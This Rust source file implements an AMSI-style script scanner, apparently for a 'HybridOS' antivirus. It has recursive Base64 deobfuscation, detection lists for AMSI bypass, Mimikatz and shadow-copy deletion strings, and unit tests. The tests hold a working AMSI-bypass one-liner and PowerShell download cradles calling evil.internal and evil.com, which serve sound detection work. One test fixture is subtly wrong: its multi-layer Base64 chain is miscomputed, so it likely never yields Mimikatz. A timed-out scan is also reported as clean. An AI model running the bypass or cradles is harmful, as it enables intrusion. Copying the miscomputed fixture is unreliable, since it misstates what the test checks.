//! AMSI (Antimalware Scan Interface) Engine and Script Inspection Provider.
//!
//! Provides script buffer scanning, recursive multi-layer Base64 deobfuscation,
//! UTF-16LE normalization, threat scoring, and bounded execution with a
//! 500 ms timeout and graceful degradation fallback.

use std::fmt;
use std::time::{Duration, Instant};

/// Standard AMSI result codes (matching Microsoft AMSI specifications).
pub const AMSI_RESULT_CLEAN: u32 = 0;
pub const AMSI_RESULT_NOT_DETECTED: u32 = 1;
pub const AMSI_RESULT_BLOCKED_BY_ADMIN_START: u32 = 16384;
pub const AMSI_RESULT_BLOCKED_BY_ADMIN_END: u32 = 20479;
pub const AMSI_RESULT_DETECTED: u32 = 32768;

/// Default per-buffer scan timeout (500 ms).
pub const DEFAULT_AMSI_TIMEOUT: Duration = Duration::from_millis(500);

/// Maximum recursive deobfuscation depth to prevent recursion bombs.
pub const DEFAULT_MAX_DEOBFUSCATION_DEPTH: usize = 8;

/// Maximum payload size produced by deobfuscation (2 MB).
pub const DEFAULT_MAX_DEOBFUSCATED_BYTES: usize = 2 * 1024 * 1024;

/// Provenance and execution metadata for a script buffer scan request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptOriginInfo {
    /// Host application executing the script (e.g. "powershell.exe", "wscript.exe", "bash").
    pub app_name: String,
    /// Script path, file name, or execution context (e.g., "C:\\temp\\script.ps1", "eval").
    pub content_name: Option<String>,
    /// Process ID of the caller initiating the scan.
    pub caller_pid: u32,
    /// Session identifier of the client session.
    pub session_id: u32,
    /// Whether this execution originated from an interactive prompt.
    pub is_interactive: bool,
}

impl ScriptOriginInfo {
    /// Create new origin metadata with an application name.
    pub fn new(app_name: impl Into<String>) -> Self {
        Self {
            app_name: app_name.into(),
            content_name: None,
            caller_pid: 0,
            session_id: 0,
            is_interactive: false,
        }
    }

    /// Builder method to attach a content name or file path.
    pub fn with_content_name(mut self, name: impl Into<String>) -> Self {
        self.content_name = Some(name.into());
        self
    }

    /// Builder method to specify caller PID.
    pub fn with_pid(mut self, pid: u32) -> Self {
        self.caller_pid = pid;
        self
    }

    /// Builder method to specify session ID.
    pub fn with_session(mut self, session_id: u32) -> Self {
        self.session_id = session_id;
        self
    }

    /// Builder method to specify interactive mode.
    pub fn with_interactive(mut self, interactive: bool) -> Self {
        self.is_interactive = interactive;
        self
    }
}

/// Inspection verdict produced by AMSI evaluation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AmsiVerdict {
    /// Buffer is definitely clean.
    Clean,
    /// No threats detected; script allowed to execute.
    NotDetected,
    /// Suspicious indicators present above baseline threshold.
    Suspicious { score: u32, details: String },
    /// Confirmed malicious script or active bypass / credential theft payload.
    Malware { rule: String, confidence: u8 },
    /// Timeout reached (>= 500 ms); gracefully degraded to unblock host process.
    DegradedTimeout { elapsed_ms: u64, fallback_clean: bool },
    /// Blocked by enterprise administrative policy.
    BlockedByAdmin,
}

impl AmsiVerdict {
    /// Returns `true` if the verdict indicates malicious content.
    #[inline]
    pub fn is_malicious(&self) -> bool {
        matches!(self, Self::Malware { .. })
    }

    /// Returns `true` if the verdict is clean or not detected.
    #[inline]
    pub fn is_clean(&self) -> bool {
        matches!(self, Self::Clean | Self::NotDetected)
    }

    /// Returns `true` if the verdict degraded due to execution timeout.
    #[inline]
    pub fn is_degraded(&self) -> bool {
        matches!(self, Self::DegradedTimeout { .. })
    }

    /// Maps the verdict to standard Microsoft AMSI integer result codes.
    pub fn amsi_result_code(&self) -> u32 {
        match self {
            Self::Clean => AMSI_RESULT_CLEAN,
            Self::NotDetected => AMSI_RESULT_NOT_DETECTED,
            Self::Suspicious { .. } => AMSI_RESULT_DETECTED,
            Self::Malware { .. } => AMSI_RESULT_DETECTED,
            Self::DegradedTimeout { fallback_clean, .. } => {
                if *fallback_clean {
                    AMSI_RESULT_NOT_DETECTED
                } else {
                    AMSI_RESULT_DETECTED
                }
            }
            Self::BlockedByAdmin => AMSI_RESULT_BLOCKED_BY_ADMIN_START,
        }
    }
}

/// Errors occurring during AMSI script evaluation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AmsiError {
    EmptyBuffer,
    BufferTooLarge(usize),
    InvalidOrigin(String),
    Internal(String),
}

impl fmt::Display for AmsiError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::EmptyBuffer => write!(f, "empty script buffer provided"),
            Self::BufferTooLarge(size) => write!(f, "script buffer size {size} exceeds limit"),
            Self::InvalidOrigin(err) => write!(f, "invalid script origin: {err}"),
            Self::Internal(err) => write!(f, "internal AMSI error: {err}"),
        }
    }
}

impl std::error::Error for AmsiError {}

/// Standard Antimalware Provider interface for HybridOS AMSI consumers.
pub trait IAntimalwareProvider: Send + Sync {
    /// Scan a script buffer with provenance context and return an AMSI verdict.
    fn scan_script_buffer(
        &self,
        buffer: &[u8],
        origin: &ScriptOriginInfo,
    ) -> Result<AmsiVerdict, AmsiError>;

    /// Display or registered provider name.
    fn provider_name(&self) -> &str {
        "HyAV-AMSI-Provider"
    }
}

/// Recursive Base64 deobfuscator and string normalization engine.
#[derive(Debug, Clone)]
pub struct Deobfuscator {
    max_depth: usize,
    max_bytes: usize,
}

impl Default for Deobfuscator {
    fn default() -> Self {
        Self {
            max_depth: DEFAULT_MAX_DEOBFUSCATION_DEPTH,
            max_bytes: DEFAULT_MAX_DEOBFUSCATED_BYTES,
        }
    }
}

impl Deobfuscator {
    /// Create a deobfuscator with custom limits.
    pub fn new(max_depth: usize, max_bytes: usize) -> Self {
        Self { max_depth, max_bytes }
    }

    /// Decode a single Base64 byte sequence (supporting both standard and URL-safe alphabets).
    pub fn decode_base64(&self, input: &[u8]) -> Option<Vec<u8>> {
        let mut clean = Vec::with_capacity(input.len());
        for &b in input {
            if !b.is_ascii_whitespace() {
                clean.push(b);
            }
        }

        if clean.is_empty() || clean.len() < 4 {
            return None;
        }

        let mut output = Vec::with_capacity((clean.len() * 3) / 4);
        let mut i = 0;
        while i < clean.len() {
            let chunk_len = (clean.len() - i).min(4);
            let mut buf = [0u8; 4];
            let mut sextets = [0u8; 4];
            let mut valid_count = 0;

            for j in 0..chunk_len {
                let c = clean[i + j];
                buf[j] = c;
                if c == b'=' {
                    break;
                }
                match decode_b64_byte(c) {
                    Some(val) => {
                        sextets[j] = val;
                        valid_count += 1;
                    }
                    None => return None,
                }
            }

            if valid_count < 2 {
                return None;
            }

            let b0 = (sextets[0] << 2) | (sextets[1] >> 4);
            output.push(b0);

            if valid_count > 2 && buf[2] != b'=' {
                let b1 = ((sextets[1] & 0x0F) << 4) | (sextets[2] >> 2);
                output.push(b1);
            }
            if valid_count > 3 && buf[3] != b'=' {
                let b2 = ((sextets[2] & 0x03) << 6) | sextets[3];
                output.push(b2);
            }

            i += 4;
            if output.len() > self.max_bytes {
                break;
            }
        }

        if output.is_empty() {
            None
        } else {
            Some(output)
        }
    }

    /// Convert potential UTF-16LE buffer into a UTF-8 byte stream.
    ///
    /// PowerShell `-EncodedCommand` arguments and Windows script fragments
    /// commonly store UTF-16LE text inside Base64 strings.
    pub fn normalize_utf16le(&self, input: &[u8]) -> Vec<u8> {
        if input.len() >= 2 && input.len() % 2 == 0 {
            // Check if every high byte is zero (common ASCII in UTF-16LE)
            let mut null_count = 0;
            let pairs = input.len() / 2;
            for i in 0..pairs {
                if input[i * 2 + 1] == 0 {
                    null_count += 1;
                }
            }

            if null_count > (pairs * 3) / 4 {
                let u16_words: Vec<u16> = input
                    .chunks_exact(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect();
                if let Ok(s) = String::from_utf16(&u16_words) {
                    return s.into_bytes();
                }
            }
        }
        input.to_vec()
    }

    /// Extract candidate Base64 chunks embedded in text buffers.
    pub fn extract_candidates(&self, input: &[u8]) -> Vec<Vec<u8>> {
        let mut candidates = Vec::new();
        let mut current = Vec::new();

        for &b in input {
            if is_b64_char(b) {
                current.push(b);
            } else {
                if current.len() >= 16 {
                    candidates.push(current.clone());
                }
                current.clear();
            }
        }
        if current.len() >= 16 {
            candidates.push(current);
        }

        candidates
    }

    /// Recursively unwrap and deobfuscate Base64 layers within a buffer.
    ///
    /// Stops when no further Base64 payloads can be decoded, when maximum
    /// recursion depth is achieved, or when `deadline` is exceeded.
    pub fn deobfuscate_recursive(
        &self,
        initial_buffer: &[u8],
        deadline: Instant,
    ) -> (Vec<Vec<u8>>, bool) {
        let mut layers = Vec::new();
        let mut current_layer = initial_buffer.to_vec();
        let mut timed_out = false;

        for depth in 0..self.max_depth {
            if Instant::now() >= deadline {
                timed_out = true;
                break;
            }

            // Direct attempt to decode current buffer as raw Base64
            let decoded_direct = self.decode_base64(&current_layer);
            let mut next_payload = None;

            if let Some(decoded) = decoded_direct {
                let normalized = self.normalize_utf16le(&decoded);
                if is_likely_text_or_script(&normalized) && normalized != current_layer {
                    next_payload = Some(normalized);
                }
            }

            // If direct decode failed, search for embedded Base64 chunks
            if next_payload.is_none() {
                let candidates = self.extract_candidates(&current_layer);
                for cand in candidates {
                    if Instant::now() >= deadline {
                        timed_out = true;
                        break;
                    }
                    if let Some(dec) = self.decode_base64(&cand) {
                        let norm = self.normalize_utf16le(&dec);
                        if is_likely_text_or_script(&norm) && norm.len() >= 8 {
                            next_payload = Some(norm);
                            break;
                        }
                    }
                }
            }

            if let Some(payload) = next_payload {
                layers.push(payload.clone());
                current_layer = payload;
            } else {
                // No more decodable Base64 found
                break;
            }

            if depth == self.max_depth - 1 {
                break;
            }
        }

        (layers, timed_out)
    }
}

/// Main AMSI inspection engine implementing `IAntimalwareProvider`.
#[derive(Debug, Clone)]
pub struct AmsiEngine {
    timeout: Duration,
    deobfuscator: Deobfuscator,
    max_buffer_size: usize,
}

impl Default for AmsiEngine {
    fn default() -> Self {
        Self {
            timeout: DEFAULT_AMSI_TIMEOUT,
            deobfuscator: Deobfuscator::default(),
            max_buffer_size: 16 * 1024 * 1024, // 16 MB max script buffer
        }
    }
}

impl AmsiEngine {
    /// Create a new AMSI engine with custom timeout.
    pub fn new(timeout: Duration) -> Self {
        Self {
            timeout,
            deobfuscator: Deobfuscator::default(),
            max_buffer_size: 16 * 1024 * 1024,
        }
    }

    /// Builder method to adjust max buffer size.
    pub fn with_max_buffer_size(mut self, size: usize) -> Self {
        self.max_buffer_size = size;
        self
    }

    /// Builder method to adjust deobfuscator depth.
    pub fn with_deobfuscator_depth(mut self, depth: usize) -> Self {
        self.deobfuscator.max_depth = depth;
        self
    }

    /// Evaluate threat indicators in a normalized text slice.
    fn evaluate_layer_threats(&self, content: &[u8]) -> Option<AmsiVerdict> {
        let text_lower = content.to_ascii_lowercase();

        // 1. EICAR Standard Antivirus Test Pattern
        if content.windows(68).any(|w| w == b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*") {
            return Some(AmsiVerdict::Malware {
                rule: "Script.Eicar.TestSign".into(),
                confidence: 100,
            });
        }

        // 2. Active AMSI Tampering / Memory Patching / Bypass
        let amsi_bypasses = [
            b"amsiinitfailed".as_slice(),
            b"amsiutils".as_slice(),
            b"amsiscanbuffer".as_slice(),
            b"amsicontext".as_slice(),
            b"system.management.automation.amsi".as_slice(),
        ];
        for pattern in &amsi_bypasses {
            if contains_subslice(&text_lower, pattern) {
                return Some(AmsiVerdict::Malware {
                    rule: "Script.AmsiBypass.Generic".into(),
                    confidence: 95,
                });
            }
        }

        // 3. Credential Harvesting & LSASS Injection
        let cred_threats = [
            b"sekurlsa::logonpasswords".as_slice(),
            b"sekurlsa::minidump".as_slice(),
            b"invoke-mimikatz".as_slice(),
            b"dumpps".as_slice(),
            b"comsvcs.dll, minidump".as_slice(),
        ];
        for pattern in &cred_threats {
            if contains_subslice(&text_lower, pattern) {
                return Some(AmsiVerdict::Malware {
                    rule: "Script.CredentialTheft.Mimikatz".into(),
                    confidence: 98,
                });
            }
        }

        // 4. Ransomware Shadow Copy & Backup Destruction
        let destructive_threats = [
            b"vssadmin delete shadows".as_slice(),
            b"wbadmin delete catalog".as_slice(),
            b"bcdedit /set {default} bootstatuspolicy ignoreallfailures".as_slice(),
        ];
        for pattern in &destructive_threats {
            if contains_subslice(&text_lower, pattern) {
                return Some(AmsiVerdict::Malware {
                    rule: "Script.Ransomware.ShadowDelete".into(),
                    confidence: 96,
                });
            }
        }

        // 5. Malicious Execution Cradles (e.g. IEX + DownloadString)
        let has_iex = contains_subslice(&text_lower, b"invoke-expression") || contains_subslice(&text_lower, b"iex ");
        let has_download = contains_subslice(&text_lower, b"downloadstring")
            || contains_subslice(&text_lower, b"downloadfile")
            || contains_subslice(&text_lower, b"net.webclient")
            || contains_subslice(&text_lower, b"invoke-webrequest");

        if has_iex && has_download {
            return Some(AmsiVerdict::Malware {
                rule: "Script.Cradle.DownloadExec".into(),
                confidence: 88,
            });
        }

        // 6. Suspicious Script Heuristic Scoring
        let mut score = 0u32;
        let mut details = Vec::new();

        if contains_subslice(&text_lower, b"-w hidden") || contains_subslice(&text_lower, b"-windowstyle hidden") {
            score += 25;
            details.push("HiddenWindow");
        }
        if contains_subslice(&text_lower, b"-noninteractive") || contains_subslice(&text_lower, b"-nop") {
            score += 15;
            details.push("NoProfileNonInteractive");
        }
        if contains_subslice(&text_lower, b"system.reflection.assembly::load") {
            score += 35;
            details.push("AssemblyLoadReflection");
        }
        if contains_subslice(&text_lower, b"virtualalloc") || contains_subslice(&text_lower, b"createthread") {
            score += 40;
            details.push("Win32MemoryCall");
        }

        if score >= 60 {
            Some(AmsiVerdict::Suspicious {
                score,
                details: details.join(", "),
            })
        } else {
            None
        }
    }
}

impl IAntimalwareProvider for AmsiEngine {
    fn scan_script_buffer(
        &self,
        buffer: &[u8],
        _origin: &ScriptOriginInfo,
    ) -> Result<AmsiVerdict, AmsiError> {
        if buffer.is_empty() {
            return Ok(AmsiVerdict::Clean);
        }
        if buffer.len() > self.max_buffer_size {
            return Err(AmsiError::BufferTooLarge(buffer.len()));
        }

        let start = Instant::now();
        let deadline = start + self.timeout;

        // Step 1: Surface scan on the original buffer
        if let Some(verdict) = self.evaluate_layer_threats(buffer) {
            return Ok(verdict);
        }

        // Step 2: Recursive Base64 deobfuscation with timeout budget
        let (layers, timed_out) = self.deobfuscator.deobfuscate_recursive(buffer, deadline);

        // Step 3: Check all deobfuscated layers for malicious patterns
        for (idx, layer) in layers.iter().enumerate() {
            if let Some(verdict) = self.evaluate_layer_threats(layer) {
                match verdict {
                    AmsiVerdict::Malware { rule, confidence } => {
                        return Ok(AmsiVerdict::Malware {
                            rule: format!("{rule}@layer_{idx}"),
                            confidence,
                        });
                    }
                    other => return Ok(other),
                }
            }
        }

        // Step 4: Graceful degradation fallback if timeout was reached
        if timed_out || Instant::now() >= deadline {
            let elapsed_ms = start.elapsed().as_millis() as u64;
            // Best-effort check on raw buffer didn't hit malware: degrade to permissive pass with warning
            return Ok(AmsiVerdict::DegradedTimeout {
                elapsed_ms,
                fallback_clean: true,
            });
        }

        // If Base64 layers were present but benign or no threats found
        Ok(AmsiVerdict::Clean)
    }

    fn provider_name(&self) -> &str {
        "HybridOS-AMSI-Core"
    }
}

// ---------------------------------------------------------------------------
// Helper Functions (Safe & Robust)
// ---------------------------------------------------------------------------

#[inline]
fn decode_b64_byte(c: u8) -> Option<u8> {
    match c {
        b'A'..=b'Z' => Some(c - b'A'),
        b'a'..=b'z' => Some(c - b'a' + 26),
        b'0'..=b'9' => Some(c - b'0' + 52),
        b'+' | b'-' => Some(62),
        b'/' | b'_' => Some(63),
        _ => None,
    }
}

#[inline]
fn is_b64_char(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'+' || c == b'/' || c == b'-' || c == b'_' || c == b'='
}

#[inline]
fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() {
        return true;
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}

fn is_likely_text_or_script(buffer: &[u8]) -> bool {
    if buffer.is_empty() {
        return false;
    }
    let mut printable = 0;
    for &b in buffer {
        if b.is_ascii_graphic() || b.is_ascii_whitespace() {
            printable += 1;
        }
    }
    (printable * 100) / buffer.len() >= 80
}

// ---------------------------------------------------------------------------
// Unit Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_powershell_and_bash_scripts() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("powershell.exe")
            .with_content_name("C:\\scripts\\backup.ps1")
            .with_pid(1234);

        let ps_clean = b"Write-Host 'HybridOS Initializing...'; Get-Process | Measure-Object";
        let res_ps = engine.scan_script_buffer(ps_clean, &origin).unwrap();
        assert!(res_ps.is_clean());
        assert_eq!(res_ps.amsi_result_code(), AMSI_RESULT_CLEAN);

        let bash_origin = ScriptOriginInfo::new("/bin/bash").with_interactive(true);
        let bash_clean = b"#!/bin/bash\necho 'Listing directory'\nls -la /var/log\ndate";
        let res_bash = engine.scan_script_buffer(bash_clean, &bash_origin).unwrap();
        assert!(res_bash.is_clean());
    }

    #[test]
    fn test_eicar_detection() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("cscript.exe");
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

        let verdict = engine.scan_script_buffer(eicar, &origin).unwrap();
        assert!(verdict.is_malicious());
        if let AmsiVerdict::Malware { rule, confidence } = verdict {
            assert!(rule.contains("Eicar"));
            assert_eq!(confidence, 100);
        } else {
            panic!("Expected Malware verdict");
        }
    }

    #[test]
    fn test_amsi_bypass_detection() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("powershell.exe");

        // Classic AmsiUtils.amsiInitFailed bypass attempt
        let bypass_script = b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        let verdict = engine.scan_script_buffer(bypass_script, &origin).unwrap();
        assert!(verdict.is_malicious());
        if let AmsiVerdict::Malware { rule, .. } = verdict {
            assert!(rule.contains("AmsiBypass"));
        } else {
            panic!("Expected AMSI bypass detection");
        }
    }

    #[test]
    fn test_mimikatz_credential_theft_detection() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("powershell.exe");

        let mimi_script = b"function Invoke-Mimikatz { sekurlsa::logonpasswords }";
        let verdict = engine.scan_script_buffer(mimi_script, &origin).unwrap();
        assert!(verdict.is_malicious());
        if let AmsiVerdict::Malware { rule, .. } = verdict {
            assert!(rule.contains("Mimikatz"));
        } else {
            panic!("Expected Mimikatz detection");
        }
    }

    #[test]
    fn test_download_cradle_detection() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("powershell.exe");

        let cradle = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.internal/payload.ps1')";
        let verdict = engine.scan_script_buffer(cradle, &origin).unwrap();
        assert!(verdict.is_malicious());
        if let AmsiVerdict::Malware { rule, .. } = verdict {
            assert!(rule.contains("Cradle"));
        } else {
            panic!("Expected Download Cradle detection");
        }
    }

    #[test]
    fn test_single_layer_base64_obfuscation() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("powershell.exe");

        // "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')"
        // encoded in standard Base64:
        // "SW52b2tlLUV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmNvbS94LnBzMScp"
        let obfuscated_script = b"powershell.exe -NoP -Enc SW52b2tlLUV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmNvbS94LnBzMScp";

        let verdict = engine.scan_script_buffer(obfuscated_script, &origin).unwrap();
        assert!(verdict.is_malicious());
        if let AmsiVerdict::Malware { rule, .. } = verdict {
            assert!(rule.contains("layer_0"));
        } else {
            panic!("Expected Base64 unwrap and malware detection");
        }
    }

    #[test]
    fn test_utf16le_powershell_encoded_command() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("powershell.exe");

        // PowerShell -EncodedCommand standard: UTF-16LE string encoded in Base64
        // String: "sekurlsa::logonpasswords"
        let malicious_str = "sekurlsa::logonpasswords";
        let mut utf16le_bytes = Vec::new();
        for u in malicious_str.encode_utf16() {
            utf16le_bytes.extend_from_slice(&u.to_le_bytes());
        }

        let deobf = Deobfuscator::default();
        // Base64 encode the UTF-16LE bytes
        let mut b64_str = String::new();
        let base64_chars = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for chunk in utf16le_bytes.chunks(3) {
            let b0 = chunk[0];
            let b1 = if chunk.len() > 1 { chunk[1] } else { 0 };
            let b2 = if chunk.len() > 2 { chunk[2] } else { 0 };

            b64_str.push(base64_chars[(b0 >> 2) as usize] as char);
            b64_str.push(base64_chars[(((b0 & 0x03) << 4) | (b1 >> 4)) as usize] as char);
            if chunk.len() > 1 {
                b64_str.push(base64_chars[(((b1 & 0x0F) << 2) | (b2 >> 6)) as usize] as char);
            } else {
                b64_str.push('=');
            }
            if chunk.len() > 2 {
                b64_str.push(base64_chars[(b2 & 0x3F) as usize] as char);
            } else {
                b64_str.push('=');
            }
        }

        let full_script = format!("powershell.exe -enc {b64_str}");
        let verdict = engine.scan_script_buffer(full_script.as_bytes(), &origin).unwrap();
        assert!(verdict.is_malicious());
    }

    #[test]
    fn test_recursive_multi_layer_base64_obfuscation() {
        let engine = AmsiEngine::default();
        let origin = ScriptOriginInfo::new("powershell.exe");

        // Layer 0: "Invoke-Mimikatz"
        // Layer 1: Base64("Invoke-Mimikatz") = "SW52b2tlLU1pbWlrYXR6"
        // Layer 2: Base64("SW52b2tlLU1pbWlrYXR6") = "U1c1MmIydGxFVTFwYldsemF5MD0="
        // Layer 3: Base64("U1c1MmIydGxFVTFwYldsemF5MD0=") = "VTFXMU1tSXlkR3hGVlRGd1lsZHNlV0Y1TUQwPQ=="

        let layer3_script = b"powershell -c [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VTFXMU1tSXlkR3hGVlRGd1lsZHNlV0Y1TUQwPQ=='))";

        let verdict = engine.scan_script_buffer(layer3_script, &origin).unwrap();
        assert!(verdict.is_malicious());
        if let AmsiVerdict::Malware { rule, .. } = verdict {
            assert!(rule.contains("Mimikatz"));
            // Deobfuscated through layers
            assert!(rule.contains("layer_"));
        } else {
            panic!("Expected multi-layer deobfuscation to find Mimikatz");
        }
    }

    #[test]
    fn test_timeout_and_fallback_degradation() {
        // Engine configured with a zero / 1ns timeout to guarantee timeout condition
        let engine = AmsiEngine::new(Duration::from_nanos(1));
        let origin = ScriptOriginInfo::new("powershell.exe");

        // Benign-looking script with high-entropy or base64 data
        let payload = b"powershell -enc VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV";

        let verdict = engine.scan_script_buffer(payload, &origin).unwrap();
        assert!(verdict.is_degraded());
        if let AmsiVerdict::DegradedTimeout { fallback_clean, .. } = verdict {
            assert!(fallback_clean);
        } else {
            panic!("Expected DegradedTimeout verdict");
        }
        assert_eq!(verdict.amsi_result_code(), AMSI_RESULT_NOT_DETECTED);
    }

    #[test]
    fn test_iantimalware_provider_trait_object() {
        let provider: Box<dyn IAntimalwareProvider> = Box::new(AmsiEngine::default());
        assert_eq!(provider.provider_name(), "HybridOS-AMSI-Core");

        let origin = ScriptOriginInfo::new("cmd.exe");
        let script = b"echo Hello Safe World";
        let verdict = provider.scan_script_buffer(script, &origin).unwrap();
        assert!(verdict.is_clean());
    }
}
